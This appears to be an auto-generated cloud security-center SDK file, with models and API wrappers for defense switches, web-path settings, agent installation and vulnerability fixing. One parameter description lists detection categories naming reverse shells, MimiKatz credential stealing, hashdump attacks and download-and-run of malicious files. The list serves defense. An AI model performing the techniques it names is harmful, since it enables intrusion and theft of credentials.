async function modifyWebLockUpdateConfigWithOptions(request: ModifyWebLockUpdateConfigRequest, runtime: Util.RuntimeOptions): ModifyWebLockUpdateConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defenceMode)) {
    query['DefenceMode'] = request.defenceMode;
  }
  if (!Util.isUnset(request.dir)) {
    query['Dir'] = request.dir;
  }
  if (!Util.isUnset(request.exclusiveDir)) {
    query['ExclusiveDir'] = request.exclusiveDir;
  }
  if (!Util.isUnset(request.exclusiveFile)) {
    query['ExclusiveFile'] = request.exclusiveFile;
  }
  if (!Util.isUnset(request.exclusiveFileType)) {
    query['ExclusiveFileType'] = request.exclusiveFileType;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.inclusiveFile)) {
    query['InclusiveFile'] = request.inclusiveFile;
  }
  if (!Util.isUnset(request.inclusiveFileType)) {
    query['InclusiveFileType'] = request.inclusiveFileType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.localBackupDir)) {
    query['LocalBackupDir'] = request.localBackupDir;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockUpdateConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockUpdateConfig(request: ModifyWebLockUpdateConfigRequest): ModifyWebLockUpdateConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockUpdateConfigWithOptions(request, runtime);
}

model ModifyWebPathRequest {
  config?: string(name='Config', example='{
      "webPathType": "customize",
      "webPath": "/root/www****"
}'),
  target?: string(name='Target', example='[{"target":"0186127a-d33e-4d0c-94fb-8f25f87bc69f","targetType":"uuid","flag":"add"}]'),
  type?: string(name='Type', example='web_path'),
}

model ModifyWebPathResponseBody = {
  requestId?: string(name='RequestId', example='20623245-7E5E-52CA-9640-7502F119****'),
  success?: boolean(name='Success', example='true'),
}

model ModifyWebPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebPathResponseBody(name='body'),
}

async function modifyWebPathWithOptions(request: ModifyWebPathRequest, runtime: Util.RuntimeOptions): ModifyWebPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebPath(request: ModifyWebPathRequest): ModifyWebPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebPathWithOptions(request, runtime);
}

model OpenSensitiveFileScanRequest {
  switchOn?: string(name='SwitchOn', description='Specifies whether to enable or disable sensitive file scan. Valid values:

*   **on**: enables sensitive file scan
*   **off**: disables sensitive file scan', example='on'),
}

model OpenSensitiveFileScanResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    switchOn?: string(name='SwitchOn', description='Indicates whether sensitive file scan is enabled or disabled. Valid values:

*   **on**: enabled
*   **off**: disabled', example='on'),
  }(name='Data', description='The data.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B4A4C081-7F06-5481-9323-02A5419B9423'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model OpenSensitiveFileScanResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OpenSensitiveFileScanResponseBody(name='body'),
}

async function openSensitiveFileScanWithOptions(request: OpenSensitiveFileScanRequest, runtime: Util.RuntimeOptions): OpenSensitiveFileScanResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.switchOn)) {
    query['SwitchOn'] = request.switchOn;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OpenSensitiveFileScan',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function openSensitiveFileScan(request: OpenSensitiveFileScanRequest): OpenSensitiveFileScanResponse {
  var runtime = new Util.RuntimeOptions{};
  return openSensitiveFileScanWithOptions(request, runtime);
}

model OperateAgentClientInstallRequest {
  instanceIds?: string(name='InstanceIds', description='The IDs of the servers on which you want to install the Security Center agent. Separate multiple IDs with commas (,).

>  You must specify at least one of the **InstanceIds** and **Uuids** parameters before you can call this operation.', example='i-uf6j8vq9l4r5ntht****'),
  lang?: string(name='Lang'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers on which you want to install the Security Center agent. Separate multiple UUIDs with commas (,).

>  You must specify at least one of the **InstanceIds** and **Uuids** parameters before you can call this operation.', example='1587bedb-fdb4-48c4-9330-************'),
}

model OperateAgentClientInstallResponseBody = {
  aegisCelintInstallResposeList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-uf6j8vq9l4r5ntht****'),
      recordId?: long(name='RecordId', description='The ID of the installation task.', example='2856'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='1587bedb-fdb4-48c4-9330-****'),
    }
  ](name='AegisCelintInstallResposeList', description='An array that consists of the returned results.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AE79B457-877C-51C6-AD72-0D34A025D***'),
}

model OperateAgentClientInstallResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateAgentClientInstallResponseBody(name='body'),
}

async function operateAgentClientInstallWithOptions(request: OperateAgentClientInstallRequest, runtime: Util.RuntimeOptions): OperateAgentClientInstallResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateAgentClientInstall',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateAgentClientInstall(request: OperateAgentClientInstallRequest): OperateAgentClientInstallResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateAgentClientInstallWithOptions(request, runtime);
}

model OperateCommonOverallConfigRequest {
  config?: string(name='Config', description='Specifies whether to enable or disable the feature. Valid values:

*   **on**: enable
*   **off**: disable', example='on'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='223.79.XX.XX'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service execution high-risk operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service execution suspicious operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant Advanced Protection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Create malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Create suspicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Ingress service execute command \\[enhanced mode] (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service execution a high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service execution suspicious operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Create malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service execution high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Ingress service implants suspicious script/binary file (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: obfuscated command (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Command line download and run malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_71131**: Ingress service executes sequence of suspicious behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell execute suspicious command (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Command line download and run malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive Registry Key Protection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: high-risk account manipulation behavior (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Create service autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Create high-risk autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Create scheduled task autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Create registry autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Create WMI autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk orders (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: suspected privilege escalation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk orders (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: malicious drivers (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Against security software (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: process debugging (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijack dynamic link library (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypassing security monitoring (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Load high-risk drivers (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Running high-risk ARK tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Against security software (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacking the PAM Module (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump Attack (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54383**: MimiKatz Credential Stealing (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump Attack (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound Shell (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound Shell (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious soft communication (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: malicious script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: ransomware (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected Extortion (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: ransomware (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected Extortion (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: delete system backup behavior (Windows)', example='kdump_switch'),
}

model OperateCommonOverallConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model OperateCommonOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateCommonOverallConfigResponseBody(name='body'),
}

async function operateCommonOverallConfigWithOptions(request: OperateCommonOverallConfigRequest, runtime: Util.RuntimeOptions): OperateCommonOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateCommonOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateCommonOverallConfig(request: OperateCommonOverallConfigRequest): OperateCommonOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateCommonOverallConfigWithOptions(request, runtime);
}

model OperateCommonTargetConfigRequest {
  fieldName?: string(name='FieldName', example='repoName'),
  fieldValue?: string(name='FieldValue', example='cafcmc-dev'),
  sourceIp?: string(name='SourceIp', example='182.92.XXX.XXX'),
  targetOperations?: string(name='TargetOperations', example='[
      {
            "targetType": "uuid",
            "target": "f329a044-6a2f-49a0-9d33-352f6c1d****",
            "flag": "del"
      }
]'),
  targetType?: string(name='TargetType', example='uuid'),
  type?: string(name='Type', example='alidetect'),
}

model OperateCommonTargetConfigResponseBody = {
  requestId?: string(name='RequestId', example='95D45C44-4F53-5ED2-8E12-7D134564B****'),
}

model OperateCommonTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateCommonTargetConfigResponseBody(name='body'),
}

async function operateCommonTargetConfigWithOptions(request: OperateCommonTargetConfigRequest, runtime: Util.RuntimeOptions): OperateCommonTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.targetOperations)) {
    query['TargetOperations'] = request.targetOperations;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateCommonTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateCommonTargetConfig(request: OperateCommonTargetConfigRequest): OperateCommonTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateCommonTargetConfigWithOptions(request, runtime);
}

model OperateImageBaselineWhitelistRequest {
  baselineItemKeyList?: string(name='BaselineItemKeyList', example='hc.image.checklist.identify.hc_exploit_es_linux.item'),
  imageUuid?: string(name='ImageUuid', example='a5250ebca765dc9eb1a84b790b0e****'),
  lang?: string(name='Lang', example='zh'),
  operation?: string(name='Operation', example='add'),
  scanRange?: [ string ](name='ScanRange'),
}

model OperateImageBaselineWhitelistResponseBody = {
  requestId?: string(name='RequestId', example='75AD186B-B46A-56CC-BE35-987ADDF6****'),
}

model OperateImageBaselineWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateImageBaselineWhitelistResponseBody(name='body'),
}

async function operateImageBaselineWhitelistWithOptions(request: OperateImageBaselineWhitelistRequest, runtime: Util.RuntimeOptions): OperateImageBaselineWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineItemKeyList)) {
    query['BaselineItemKeyList'] = request.baselineItemKeyList;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.operation)) {
    query['Operation'] = request.operation;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateImageBaselineWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateImageBaselineWhitelist(request: OperateImageBaselineWhitelistRequest): OperateImageBaselineWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateImageBaselineWhitelistWithOptions(request, runtime);
}

model OperateImageVulRequest {
  info?: string(name='Info', example='[{\\"namespace\\":\\"cloud_oa****\\",\\"repoName\\":\\"hybirdc****\\",\\"regionId\\":\\"cn-shanghai\\",\\"instanceId\\":\\"cri-rv4nvbv8iju4****\\",\\"repoId\\":\\"crr-2q7302qrofxg****\\",\\"tag\\":\\"hybird-cloud-web_fix_167115945****\\",\\"digest\\":\\"e1a4fd25884ca2ef8840bb252c9926e4f549df9e046500dd93539b2d458c****\\",\\"newTag\\":\\"hybird-cloud-web_fix_167115996****\\",\\"uuid\\":\\"4ad91dd8c0c02de6574fa98085d0****\\",\\"ids\\":[197540864,197540865,197540869]}]'),
  operateType?: string(name='OperateType', example='vul_fix'),
  type?: string(name='Type', example='cve'),
}

model OperateImageVulResponseBody = {
  requestId?: string(name='RequestId', example='486F2228-438A-544A-A533-433F943C15CD'),
}

model OperateImageVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateImageVulResponseBody(name='body'),
}

async function operateImageVulWithOptions(request: OperateImageVulRequest, runtime: Util.RuntimeOptions): OperateImageVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.info)) {
    query['Info'] = request.info;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateImageVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateImageVul(request: OperateImageVulRequest): OperateImageVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateImageVulWithOptions(request, runtime);
}

model OperateSuspiciousOverallConfigRequest {
  config?: string(name='Config', description='Specifies whether to enable the feature. Valid values:

*   **on**: yes
*   **off**: no', example='off'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  noTargetAsOn?: boolean(name='NoTargetAsOn', description='Specifies whether to configure assets for the feature. Default value: **false**. Valid values:

*   **true**: yes
*   **false**: no

>  This parameter takes effect only when you set **Config** to **on**.', example='true'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='222.178.XX.XX'),
  type?: string(name='Type', description='The type of the feature. Valid values:

*   **auto_breaking**: Anti-Virus
*   **ransomware_breaking**: Anti-ransomware (Bait Capture)
*   **webshell\\_cloud_breaking**: Webshell Protection
*   **alinet**: Behavior prevention
*   **k8s\\_log_analysis**: K8s Threat Detection
*   **alisecguard**: Defense mode for Client Protection', example='k8s_log_analysis'),
}

model OperateSuspiciousOverallConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
}

model OperateSuspiciousOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateSuspiciousOverallConfigResponseBody(name='body'),
}

async function operateSuspiciousOverallConfigWithOptions(request: OperateSuspiciousOverallConfigRequest, runtime: Util.RuntimeOptions): OperateSuspiciousOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.noTargetAsOn)) {
    query['NoTargetAsOn'] = request.noTargetAsOn;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateSuspiciousOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateSuspiciousOverallConfig(request: OperateSuspiciousOverallConfigRequest): OperateSuspiciousOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateSuspiciousOverallConfigWithOptions(request, runtime);
}

model OperateSuspiciousTargetConfigRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  targetOperations?: string(name='TargetOperations', description='The configuration of proactive defense for your server. The value includes the following fields:

*   **targetType**: specifies the dimension from which you manage proactive defense. UUIDs are supported. Set the value to **uuid**.
*   **target**: specifies the UUID of the server for which you want to configure proactive defense.
*   **flag**: specifies whether to enable or disable proactive defense for your server. Valid values are **add** and **del**. The value add indicates that proactive defense will be enabled for your server. The value del indicates that proactive defense will be disabled for your server.', example='"[{"targetType":"uuid","target":"0585f81a-dd84-4ddf-9971-f59d12345678","flag":"add"},{"targetType":"uuid","target":"01acfd9d-e6a4-4e61-b9eb-aae012345678","flag":"add"},{"targetType":"uuid","target":"04a0e735-ad32-4835-b635-045812345678","flag":"add"}]"'),
  targetType?: string(name='TargetType', description='The dimension from which you manage proactive defense. Only the server UUID dimension is supported.

Set the value to **uuid**.', example='uuid'),
  type?: string(name='Type', description='The type of proactive defense. Valid Values:

*   **auto_breaking**: automatic blocking
*   **webshell_cloud_breaking**: webshell defense
*   **alinet**: malicious behavior defense
*   **ransomware_breaking**: ransomware capture
*   **alisecguard**: client protection', example='auto_breaking'),
}

model OperateSuspiciousTargetConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ABCD-PSD2-5256-1DSA-4222-JHBN'),
}

model OperateSuspiciousTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateSuspiciousTargetConfigResponseBody(name='body'),
}

async function operateSuspiciousTargetConfigWithOptions(request: OperateSuspiciousTargetConfigRequest, runtime: Util.RuntimeOptions): OperateSuspiciousTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.targetOperations)) {
    query['TargetOperations'] = request.targetOperations;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateSuspiciousTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateSuspiciousTargetConfig(request: OperateSuspiciousTargetConfigRequest): OperateSuspiciousTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateSuspiciousTargetConfigWithOptions(request, runtime);
}

model OperateVirusEventsRequest {
  operationAll?: int32(name='OperationAll'),
  operationCode?: string(name='OperationCode'),
  operationRange?: string(name='OperationRange'),
}

model OperateVirusEventsResponseBody = {
  requestId?: string(name='RequestId'),
  taskId?: long(name='TaskId'),
}

model OperateVirusEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateVirusEventsResponseBody(name='body'),
}

async function operateVirusEventsWithOptions(request: OperateVirusEventsRequest, runtime: Util.RuntimeOptions): OperateVirusEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.operationAll)) {
    query['OperationAll'] = request.operationAll;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationRange)) {
    query['OperationRange'] = request.operationRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateVirusEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateVirusEvents(request: OperateVirusEventsRequest): OperateVirusEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateVirusEventsWithOptions(request, runtime);
}

model OperateVulsRequest {
  operateType?: string(name='OperateType', description='The operation on the vulnerabilities. Set the value to **vul_fix**, which indicates vulnerability fixing.', example='vul_fix'),
  type?: string(name='Type', description='The type of the vulnerabilities that you want to fix. Set the value to **cve**, which indicates Linux software vulnerabilities.', example='cve'),
  uuids?: [ string ](name='Uuids', description='The UUIDs of servers for which you want to fix vulnerabilities.'),
  vulNames?: [ string ](name='VulNames', description='The names of the vulnerabilities that you want to fix.'),
}

model OperateVulsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C2677612-7207-4AEB-BD48-8BA528F86777'),
}

model OperateVulsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateVulsResponseBody(name='body'),
}

async function operateVulsWithOptions(request: OperateVulsRequest, runtime: Util.RuntimeOptions): OperateVulsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.vulNames)) {
    query['VulNames'] = request.vulNames;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateVuls',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateVuls(request: OperateVulsRequest): OperateVulsResponse {
  var runtime = new Util.RuntimeOptions{};
  return operateVulsWithOptions(request, runtime);
}

